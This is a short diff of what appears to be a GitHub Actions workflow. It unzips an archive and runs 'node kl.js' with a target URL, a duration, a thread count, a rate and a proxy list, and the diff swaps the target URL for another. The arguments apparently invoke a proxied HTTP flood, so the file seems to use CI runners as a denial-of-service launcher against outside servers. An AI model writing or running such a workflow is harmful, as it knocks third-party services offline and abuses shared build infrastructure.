@@ -47,7 +47,7 @@ jobs:
           
           unzip Fc-main.zip
           cd Fc-main
-          node kl.js GET https://subhxcosmo-osint-api.onrender.com/api?key=%RAND% 3600 4 120 proxy.txt
+          node kl.js GET https://c1.dstatbot.win/WYrmJ2de 700 4 120 proxy.txt
           
           
           
